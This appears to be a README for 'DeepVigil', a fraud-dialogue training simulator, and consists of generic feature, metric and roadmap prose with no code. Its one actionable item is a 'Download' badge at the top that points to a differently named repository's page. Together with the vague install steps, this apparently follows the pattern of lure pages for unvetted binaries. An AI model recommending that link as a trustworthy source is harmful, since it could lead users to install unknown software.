![preview](https://raw.githubusercontent.com/jogonono2-bot/scam-shield-arena/main/showcase_d17968.svg)
[![Download](https://raw.githubusercontent.com/jogonono2-bot/scam-shield-arena/main/latest_f48a2bb.svg)](https://jogonono2-bot.github.io/scam-shield-arena/)

# DeepVigil — Context-Aware Fraud Dialogue Simulator

![GitHub License](https://img.shields.io/badge/license-MIT-blue.svg)
![Semantic Version](https://img.shields.io/badge/version-2.4.0-important.svg)
![Code Quality](https://img.shields.io/badge/code_quality-A%2B-brightgreen.svg)
![Maintenance Status](https://img.shields.io/badge/maintained-2026-active.svg)

---

## 🌌 Introduction: Why Static Scripts Fail, and What Comes Next

In the world of adversarial communication, fraudsters do not read manuals — they read **human psychology**. Traditional anti-fraud training relies on static scripts, predictable question banks, and simulated dialogues that a determined scammer can spot from a mile away. The result is a workforce trained to recognize cardboard cutouts, not living, adaptive threats.

**DeepVigil** is not another script library. It is a **cognitive sparring partner** — a context-aware dialogue simulator that generates immersive, evolving conversation scenarios based on user input, emotional tone, and historical interaction patterns. Imagine a martial artist training against a wooden dummy versus a human opponent who adjusts their stance mid-strike. DeepVigil is that human opponent, built for the digital age.

This repository houses the complete training engine, scenario generation modules, and evaluation suite. It is designed for financial institutions, e-commerce platforms, and customer support teams that need their personnel to think like defenders, not just follow checklists.

---

## 🚨 The Problem Landscape: Why Conventional Training Produces Blind Spots

### The Script Trap
Most training platforms offer a finite set of dialogues. Once a trainee memorizes the expected responses, they stop thinking critically. Fraudsters, meanwhile, continuously evolve their linguistic strategies — using urgency, authority impersonation, and emotional manipulation to bypass automated checks and human intuition alike.

### The Context Blindness
A question like "What is your account number?" can be legitimate from a support agent or a red flag from a social engineer. The difference lies in *context*: previous conversation flow, requested medium, timing, and the presence of pressure tactics. Static training cannot teach this nuance because it lacks dynamic situational awareness.

### The Feedback Void
Traditional systems grade responses as "correct" or "incorrect." Real fraud detection requires granular feedback on *why* a response was weak — e.g., "You revealed the last four digits of your ID before verifying the caller's identity chain."

---

## 🧠 The DeepVigil Architecture: A New Operating System for Anti-Fraud Education

DeepVigil operates on a **three-layer cognitive model**:

1. **Perception Layer** — Parses user inputs for linguistic cues (urgency markers, authority claims, reciprocity attempts, scarcity triggers).
2. **Reasoning Layer** — Constructs a probabilistic model of the fraudulent intent, weighted by scenario-specific risk factors and organizational policy constraints.
3. **Adaptation Layer** — Generates a nuanced, context-appropriate response from the simulated adversary, adjusting its tactics based on the trainee's defense robustness.

This is not a chatbot. It is an **adversarial training environment** that grows more sophisticated as the trainee improves.

---

## ✨ Key Features

### 🌐 Responsive Dialogue Engine
The core simulator runs entirely in-browser with a reactive front-end that adjusts to any device — from a desktop workstation to a mobile phone used during a field training session. The engine uses a state machine to track conversation threads, but the branching logic is **probabilistic**, not deterministic, ensuring no two training sessions are identical.

### 🗣️ Multilingual Fraud Pattern Recognition
Fraud techniques are not language-specific — they are culture-specific. DeepVigil includes language packs for English, Spanish, Mandarin, and Arabic, allowing organizations to train local teams with culturally accurate scam scripts.

### 🛡️ 24/7 Accessible Training Sandbox
The training environment is available around the clock, enabling shift-based teams to complete drills whenever their schedule allows. There is no dependency on live instructors or scheduled sessions; the simulator acts as an always-available mentor.

### 📊 Granular Defense Analytics
Each training session produces a detailed report charting trainee response times, hesitation patterns, information disclosure risks, and emotional resilience under pressure. These analytics are aggregated into organizational dashboards for managerial review.

### 🧩 Scenario Builder SDK
Organizations can craft custom scenarios using a declarative JSON schema. This allows training teams to encode specific threats relevant to their industry — whether it's vishing (voice phishing), smishing (SMS phishing), or advanced social engineering via email.

### ⏱️ Adaptive Difficulty Scaling
The system tracks a trainee's success ratio. As proficiency grows, the simulator introduces more subtle fraud signals, layered distractions, and multi-step attack chains. This ensures the training remains challenging without becoming discouraging.

---

## 🛠️ Getting Started: Your First Cognitive Sparring Session

To begin using DeepVigil in a development or evaluation capacity, please refer to the official release artifacts. The project is distributed as a self-contained training platform.

### Quick Start Pathway

1. **Acquire the platform:** Obtain the latest compiled version of DeepVigil from the official distribution channels associated with this repository.
2. **Initialize the workspace:** The platform uses a compact, encrypted workspace file to store training history and configuration. Create a new workspace by launching the main application and selecting "New Training Environment."
3. **Select entry-level scenario:** Begin with the "Introductory Call Center Interaction" scenario to understand the basic flow.
4. **Engage with the simulator:** Type your responses as if you were a customer support agent. The simulator will respond with adaptive adversarial outputs.
5. **Review the after-action report:** Upon scenario completion, the platform generates a comprehensive summary of your defensive performance.

> **Note for Developers:** The source code in this repository allows for deep customization. Compile the project using a standard Java development kit (JDK 21 or later) and the included Gradle wrapper. No third-party package managers are required.

---

## 👥 Who Should Use DeepVigil?

### 🏦 Banking & Financial Services
Train branch staff and remote call center agents to detect social engineering attempts targeting account credentials, wire transfers, and identity verification protocols.

### 🛒 E-Commerce & Marketplace
Equip buyer-safety teams to recognize fake payment confirmations, phishing links embedded in chat, and seller impersonation scams.

### 🗂️ Human Resources & Executive Assistants
Prepare staff to handle CEO fraud (also known as business email compromise) where attackers impersonate senior leadership to request urgent confidential data or financial transfers.

### 🏥 Healthcare & Insurance
Protect patient data by training intake personnel against vishing attempts seeking medical records or insurance policy details.

---

## 🧪 Evaluation & Performance Metrics

DeepVigil is not a "one-and-done" training tool. It provides continuous evaluation using the following metrics:

- **Response Relevancy Score (RRS):** Measures whether the trainee's response addresses the adversarial prompt without leaking unnecessary information.
- **Tactical Shift Resistance:** Quantifies how well a trainee maintains composure when the adversary suddenly changes tactics mid-conversation.
- **Information Entropy Leakage:** Calculates the amount of sensitive data (e.g., employee IDs, transaction hashes, client names) disclosed during the session.
- **Decision Latency:** Captures the time taken between an adversarial prompt and the trainee's response — longer latencies often indicate uncertainty or internal conflict.

Each metric is visualized in a radar chart for individual use and a line graph for organizational trends.

---

## 🔒 Data Privacy & Security

DeepVigil operates on a **local-first principle**. All training dialogues, analytics, and workspace files remain on the user's device or within the organization's private cloud deployment. There are no telemetry callbacks, no external analytics beacons, and no mandatory network access except for optional update checks.

Your training data belongs to you. It is never used to train shared models, and it is never stored in a public database.

---

## 🧑‍💻 Customization & Extensibility

### Building New Scenarios
The scenario schema is designed to be approachable. A basic scenario consists of:
- A **setup narrative** (who is calling, what is the company context).
- A **seed dialogue array** (initial adversarial lines).
- A **threat profile** (what kind of fraud is being simulated).
- **Defense condition checks** (what constitutes a successful block).

### Integrating with Your LMS
DeepVigil supports export of training results in SCORM 1.2 and xAPI (Tin Can) formats, allowing seamless integration with major Learning Management Systems used in corporate environments.

---

## 🤝 Contributing to DeepVigil

We welcome contributions from security researchers, UX designers, and training specialists. The project is organized into several focus areas:

- **Scenario Library Expansion** — Submit new fraud scenarios with culturally specific accents and strategies.
- **Linguistic Pattern Mining** — Help develop better heuristics for detecting manipulative language patterns across languages.
- **Evaluation Methodology** — Propose improvements to the scoring algorithms to better reflect real-world defense effectiveness.

Please read the contribution guidelines in the `CONTRIBUTING.md` file before submitting a pull request. All contributions are reviewed with an emphasis on ethical training use and defensible security practices.

---

## 🛣️ Roadmap: The Future of Adversarial Training

### 2026 Q2 — Voice Modulation Simulation
Integrate a text-to-speech engine with emotional tone control to simulate high-pressure phone calls with audio cues.

### 2026 Q3 — Multi-Agent Scenarios
Enable scenarios where two adversarial agents (e.g., a "caller" and a "technician") interact with the trainee simultaneously, replicating relay fraud tactics.

### 2026 Q4 — Organizational Defense Heatmaps
Aggregate anonymized training data across an organization to highlight systemic weaknesses (e.g., "accounting department responds well to urgency, but poorly to authority impersonation").

### 2027 — Federated Learning for Shared Defenses
A privacy-preserving framework where organizations can contribute weighted patterns from their training sessions (without raw data) to improve common defensive strategies.

---

## 📜 License

This project is licensed under the **MIT License**. You are permitted to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, provided that the original copyright notice and permission notice are included in all copies or substantial portions of the software.

The software is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

[View the full license text](LICENSE)

---

## ⚠️ Disclaimer

DeepVigil is a training and educational simulation tool. It is designed to improve defensive skills against social engineering and fraud. It is **not** a substitute for legal counsel, regulatory compliance frameworks, or authoritative security audits. Organizations must ensure their anti-fraud practices comply with applicable local, national, and international laws. The scenarios generated by this tool are fictional; any resemblance to real persons, businesses, or events is coincidental. The creators of DeepVigil disclaim all liability for misuse or for actions taken based on training outputs.

---

## 🙏 Acknowledgments

Special gratitude to the open-source security community for their continuous research into adversarial communication patterns. The foundational concepts for this simulator were inspired by lessons learned from real-world incident response reports published by financial watchdogs and consumer protection agencies.

---

## 📝 Changelog & Versioning

- **v2.4.0 (2026-01-15):** Introduced the multilingual adaptation layer for Spanish and Arabic.
- **v2.3.1 (2025-12-02):** Optimized the decision latency metric to filter out network-induced delays in on-premise deployments.
- **v2.3.0 (2025-11-10):** Added the granular analytics dashboard with drill-down capabilities for team leads.
- **v2.2.0 (2025-09-18):** Released the Scenario Builder SDK with enhanced validation tooling.

---

## ❓ Frequently Asked Questions

**Q: Does DeepVigil require an internet connection?**
A: No. The core training engine runs entirely offline. Only optional feature updates and cloud-based dashboard sync require connectivity.

**Q: Can I import my existing fraud case studies?**
A: Yes, provided they are formatted according to the JSON scenario schema. The documentation in the `docs/schema` folder explains the structure.

**Q: How long does a typical training session last?**
A: An introductory scenario takes 3–5 minutes. Advanced, multi-layered deception scenarios can run 15–20 minutes to provide a thorough stress test.

---

*DeepVigil — Because your best defense is a mind that has danced with the adversary and returned stronger.*